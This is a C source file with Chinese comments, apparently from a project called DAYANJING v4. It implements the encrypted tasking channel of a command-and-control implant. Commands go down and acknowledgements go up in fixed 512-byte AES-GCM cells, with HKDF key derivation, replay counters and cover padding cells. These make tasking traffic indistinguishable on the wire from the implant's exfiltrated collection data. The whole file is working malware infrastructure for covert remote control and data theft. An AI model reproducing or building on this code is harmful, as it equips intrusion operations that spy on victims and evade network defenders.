/*
 * DAYANJING v4 — task_link.c
 *
 * 任务通道的 IO 绑定实现。设计说明见 exfil_task_link.h。
 *
 * 本层负责四件事：
 *   1) 恒定 512 字节信元的可靠读写（TCP 拆包/短写）
 *   2) 信元层密钥的域分离派生（与采集数据通道不复用）
 *   3) 两个方向各用各的密钥 —— 封包 ks、解包 kr
 *   4) seq 严格递增 —— c2_frame 不提供的重放防护，在此补齐
 *
 * 帧层（02_c2 c2_frame）仍是内层：它提供 msg_type 区分命令/回执、
 * 以及与 Python 侧 frame.py 的跨语言互操作。信元层只是**恒长运输**，
 * 不承担语义。因此内层报文是"已 AEAD 的帧"，信元再封一次 ——
 * 这层额外的 AEAD 开销（16 字节 tag + 一次 GCM）对低频命令通道
 * 可忽略，换来的是与采集产物完全一致的线上形态。
 */

#include "exfil_task_link.h"
#include "exfil_link.h"

#include "crypto_hash.h"
#include "crypto_gcm.h"

#include <string.h>

/* 域分离 salt：任务通道 ≠ 采集数据通道 */
static const uint8_t SALT[] = "dayanjing:exfil:task:v1";

/* ---- 会话状态 ---- */

int exfil_task_chan_init(exfil_task_chan_t *ch,
                         const uint8_t ks[16], const uint8_t kr[16],
                         const uint8_t pfx[8])
{
    uint8_t k_send[16], k_recv[16], pfx_cell[8], ikm[32];

    if (!ch || !ks || !kr || !pfx) return EXF_TASK_ERR_ARG;
    /* 方向分离不可退化：同一把密钥会让两个方向的 IV 空间重合 */
    /* SEC-CMP:DEGENERATE: 拒绝双向同钥（send/recv 退化则 nonce 空间重合）。相等是异常态，正常派生下永不出现，攻击者无法观测该结论。注意：本文件另两处【排序】比较比的是同一对密钥但用于定序，已改用 crypto_ct_cmp —— 判据不同，不能一概而论。 */
    if (memcmp(ks, kr, 16) == 0) return EXF_TASK_ERR_ARG;

    memset(ch, 0, sizeof *ch);
    memcpy(ch->ks, ks, 16);
    memcpy(ch->kr, kr, 16);

    /*
     * 规范序：ikm 必须是 min||max，两端才算出同一个值。
     * 若写成 ks||kr，服务端得到 K_A||K_B 而植入体得到 K_B||K_A，
     * 派生结果南辕北辙 —— 这是"两端互补持有密钥"极易踩的坑。
     */
    {
        const uint8_t *klo, *khi;
        /*
         * SEC-CMP:ORDER: 此处比较对象是【双向会话密钥 ks/kr】，不是节点 ID。
         *   类级理由在这里不成立 —— 密钥是秘密，memcmp 会在首个失配字节
         *   终止，泄露"两密钥首处分歧位置"。改用常量时间三路比较
         *   crypto_ct_cmp（步数恒为 len，循环体内无数据相关分支）。
         *   攻击者无法注入密钥、也无法测量单次本地比较，风险等级低；
         *   但这是"测不出来"而非"不存在"，故按秘密处理。
         */
        if (crypto_ct_cmp(ks, kr, 16) < 0) { klo = ks; khi = kr; }
        else                               { klo = kr; khi = ks; }
        memcpy(ikm, klo, 16);
        memcpy(ikm + 16, khi, 16);
    }

    /*
     * 信元层密钥：**按密钥身份派生，而不是按方向标签派生**。
     *
     * "send/recv" 是端相对的（两端各自 send），若直接以 "cell-send"
     * 作 info，服务端 send 与植入体 recv 会派生出两个不同的密钥。
     * 正确做法是以密钥在规范序中的**位置**（lo/hi）作标签：
     *   服务端 ks==klo -> k_send = dir:lo；植入体 kr==klo -> k_recv = dir:lo
     * 两端因此得到同一把下行密钥。
     */
    {
        /* 常量时间排序（已用 crypto_ct_cmp，非 memcmp，不在 SEC-CMP 扫描范围）：比较对象是双向会话密钥，memcmp 会在首个失配字节终止、泄露分歧位置。攻击者既无法注入密钥也无法测量单次本地比较，风险等级低，但按秘密处理。 */
        int ks_is_lo = (crypto_ct_cmp(ks, kr, 16) < 0);
        const uint8_t *info_s = ks_is_lo
                              ? (const uint8_t *)"cell:dir:lo"
                              : (const uint8_t *)"cell:dir:hi";
        const uint8_t *info_r = ks_is_lo
                              ? (const uint8_t *)"cell:dir:hi"
                              : (const uint8_t *)"cell:dir:lo";

        if (hkdf(SALT, sizeof SALT - 1, ikm, sizeof ikm,
                 info_s, 12, k_send, 16) != 0)
            return EXF_TASK_ERR_ARG;
        if (hkdf(SALT, sizeof SALT - 1, ikm, sizeof ikm,
                 info_r, 12, k_recv, 16) != 0)
            return EXF_TASK_ERR_ARG;
    }

    if (hkdf(SALT, sizeof SALT - 1, ikm, sizeof ikm,
             (const uint8_t *)"cell:pfx", 9, pfx_cell, 8) != 0)
        return EXF_TASK_ERR_ARG;
    if (hkdf(SALT, sizeof SALT - 1, ikm, sizeof ikm,
             (const uint8_t *)"frame:pfx", 10, ch->pfx_frame, 8) != 0)
        return EXF_TASK_ERR_ARG;

    (void)pfx;  /* 入参 pfx 仅作调用方约定保留；实际前缀一律派生，
                 * 避免调用方传入与采集通道相同的前缀造成 IV 空间重合。 */

    if (p2p_cell_init(&ch->cell, k_send, k_recv, pfx_cell) != P2P_CELL_OK)
        return EXF_TASK_ERR_ARG;

    ch->has_down = 0;
    ch->has_up = 0;
    return EXF_TASK_OK;
}

int exfil_task_chan_resume(exfil_task_chan_t *ch,
                           const uint8_t ks[16], const uint8_t kr[16],
                           const uint8_t pfx[8],
                           uint32_t send_ctr, uint32_t recv_ctr,
                           uint64_t last_seq_down, uint64_t last_seq_up)
{
    int rc = exfil_task_chan_init(ch, ks, kr, pfx);
    if (rc != EXF_TASK_OK) return rc;

    /*
     * 覆盖计数器。语义对齐 p2p_cell_unpack：
     *   send_counter / recv_counter 都是"下一个将要使用的值"。
     * 恢复点缓存的也必须是这个语义，否则会差一个 IV。
     */
    ch->cell.send_counter = send_ctr;
    ch->cell.recv_counter = recv_ctr;
    ch->cell.recv_init    = 1;

    ch->last_seq_down = last_seq_down;
    ch->last_seq_up   = last_seq_up;
    ch->has_down      = 1;
    ch->has_up        = 1;
    return EXF_TASK_OK;
}

void exfil_task_chan_checkpoint(const exfil_task_chan_t *ch,
                                uint32_t *send_ctr, uint32_t *recv_ctr,
                                uint64_t *last_seq_down,
                                uint64_t *last_seq_up)
{
    if (!ch) return;
    if (send_ctr)      *send_ctr      = ch->cell.send_counter;
    if (recv_ctr)      *recv_ctr      = ch->cell.recv_counter;
    if (last_seq_down) *last_seq_down = ch->last_seq_down;
    if (last_seq_up)   *last_seq_up   = ch->last_seq_up;
}

void exfil_task_chan_wipe(exfil_task_chan_t *ch)
{
    if (!ch) return;
    p2p_cell_wipe(&ch->cell);
    memset(ch, 0, sizeof *ch);
}

/* ---- 恒定长度信元 ---- */

int exfil_task_chan_send_raw(exfil_task_chan_t *ch, int fd,
                             const uint8_t *frame, size_t frame_len)
{
    uint8_t cell[P2P_CELL_WIRE];
    int     r;

    if (!ch || fd < 0 || !frame) return EXF_TASK_ERR_ARG;
    if (frame_len == 0 || frame_len > P2P_CELL_DATA_MAX) return EXF_TASK_ERR_LEN;

    r = p2p_cell_pack(&ch->cell, P2P_CELL_CMD_DATA, frame, frame_len, cell);
    if (r != P2P_CELL_OK) return EXF_TASK_ERR_LEN;

    if (exfil_link_write_all(fd, cell, P2P_CELL_WIRE) != 0)
        return EXF_TASK_ERR_IO;
    return EXF_TASK_OK;
}

int exfil_task_chan_cover(exfil_task_chan_t *ch, int fd)
{
    uint8_t cell[P2P_CELL_WIRE];

    if (!ch || fd < 0) return EXF_TASK_ERR_ARG;

    /* 与数据共用 &ch->cell：counter 单调是硬约束，不得另起上下文 */
    if (p2p_cell_pack_cover(&ch->cell, cell) != P2P_CELL_OK)
        return EXF_TASK_ERR_FMT;

    if (exfil_link_write_all(fd, cell, P2P_CELL_WIRE) != 0)
        return EXF_TASK_ERR_IO;

    return EXF_TASK_OK;
}

/* ---- 下行：命令 ---- */

int exfil_task_chan_cmd(exfil_task_chan_t *ch, int fd, uint64_t seq,
                        const exfil_task_cmd_t *c)
{
    uint8_t frame[512];
    uint8_t cell[P2P_CELL_WIRE];
    size_t  flen = 0;
    int     r;

    if (!ch || !c) return EXF_TASK_ERR_ARG;

    /* 帧层 IV = pfx_frame || 本端发送计数（严格递增，不会重用） */
    r = exfil_task_seal_cmd(ch->ks, ch->pfx_frame,
                            ch->cell.send_counter, seq, c,
                            frame, sizeof frame, &flen);
    if (r != EXF_TASK_OK) return r;

    r = p2p_cell_pack(&ch->cell, P2P_CELL_CMD_DATA, frame, flen, cell);
    if (r != P2P_CELL_OK) return EXF_TASK_ERR_LEN;

    if (exfil_link_write_all(fd, cell, P2P_CELL_WIRE) != 0)
        return EXF_TASK_ERR_IO;

    return EXF_TASK_OK;
}

int exfil_task_chan_recv_cmd(exfil_task_chan_t *ch, int fd, uint64_t *seq,
                             exfil_task_cmd_t *c)
{
    uint8_t  cell[P2P_CELL_WIRE];
    uint8_t  frame[512];
    uint8_t  cmd;
    size_t   flen = 0, got;
    uint64_t s = 0;
    int      r;

    if (!ch || !c) return EXF_TASK_ERR_ARG;

    got = exfil_link_read_exact(fd, cell, P2P_CELL_WIRE);
    if (got == 0) return EXF_TASK_ERR_CLOSED;
    if (got < P2P_CELL_WIRE) return EXF_TASK_ERR_IO;

    r = p2p_cell_unpack(&ch->cell, cell, &cmd, frame, sizeof frame, &flen);
    if (r == P2P_CELL_ERR_REPLAY) return EXF_TASK_ERR_REPLAY;
    if (r == P2P_CELL_ERR_AUTH)   return EXF_TASK_ERR_AUTH;
    if (r != P2P_CELL_OK)         return EXF_TASK_ERR_FMT;

    /*
     * 覆盖信元：counter 已由 cell_unpack 推进（防重放仍然有效），
     * 但**不推进 seq** —— 覆盖不占用命令序号空间。返回正值 EXF_TASK_PAD，
     * 调用方继续读下一个。
     */
    if (cmd == P2P_CELL_CMD_PAD)  return EXF_TASK_PAD;
    if (cmd != P2P_CELL_CMD_DATA) return EXF_TASK_ERR_FMT;  /* FIN 不应出现在任务通道 */

    /* 解包用 kr —— 方向密钥约定，见头文件说明 */
    r = exfil_task_open_cmd(ch->kr, frame, flen, &s, c);
    if (r != EXF_TASK_OK) return r;

    if (ch->has_down && s <= ch->last_seq_down) return EXF_TASK_ERR_REPLAY;
    ch->last_seq_down = s;
    ch->has_down = 1;
    if (seq) *seq = s;
    return EXF_TASK_OK;
}

/* ---- 上行：回执 ---- */

int exfil_task_chan_ack(exfil_task_chan_t *ch, int fd, uint64_t seq,
                        const exfil_task_ack_t *a)
{
    uint8_t frame[512];
    uint8_t cell[P2P_CELL_WIRE];
    size_t  flen = 0;
    int     r;

    if (!ch || !a) return EXF_TASK_ERR_ARG;

    /*
     * 封包用 ks —— 早期版本此处误用 kr，导致两方向退化成同一密钥
     * 且 IV 完全重合（GCM 致命误用）。见头文件"方向密钥约定"。
     */
    r = exfil_task_seal_ack(ch->ks, ch->pfx_frame,
                            ch->cell.send_counter, seq, a,
                            frame, sizeof frame, &flen);
    if (r != EXF_TASK_OK) return r;

    r = p2p_cell_pack(&ch->cell, P2P_CELL_CMD_DATA, frame, flen, cell);
    if (r != P2P_CELL_OK) return EXF_TASK_ERR_LEN;

    if (exfil_link_write_all(fd, cell, P2P_CELL_WIRE) != 0)
        return EXF_TASK_ERR_IO;

    return EXF_TASK_OK;
}

int exfil_task_chan_recv_ack(exfil_task_chan_t *ch, int fd, uint64_t *seq,
                             exfil_task_ack_t *a)
{
    uint8_t  cell[P2P_CELL_WIRE];
    uint8_t  frame[512];
    uint8_t  cmd;
    size_t   flen = 0, got;
    uint64_t s = 0;
    int      r;

    if (!ch || !a) return EXF_TASK_ERR_ARG;

    got = exfil_link_read_exact(fd, cell, P2P_CELL_WIRE);
    if (got == 0) return EXF_TASK_ERR_CLOSED;
    if (got < P2P_CELL_WIRE) return EXF_TASK_ERR_IO;

    r = p2p_cell_unpack(&ch->cell, cell, &cmd, frame, sizeof frame, &flen);
    if (r == P2P_CELL_ERR_REPLAY) return EXF_TASK_ERR_REPLAY;
    if (r == P2P_CELL_ERR_AUTH)   return EXF_TASK_ERR_AUTH;
    if (r != P2P_CELL_OK)         return EXF_TASK_ERR_FMT;

    /* 覆盖信元：counter 已推进，seq 不动（同上） */
    if (cmd == P2P_CELL_CMD_PAD)  return EXF_TASK_PAD;
    if (cmd != P2P_CELL_CMD_DATA) return EXF_TASK_ERR_FMT;  /* FIN 不应出现在任务通道 */

    /* 解包用 kr */
    r = exfil_task_open_ack(ch->kr, frame, flen, &s, a);
    if (r != EXF_TASK_OK) return r;

    if (ch->has_up && s <= ch->last_seq_up) return EXF_TASK_ERR_REPLAY;
    ch->last_seq_up = s;
    ch->has_up = 1;
    if (seq) *seq = s;
    return EXF_TASK_OK;
}
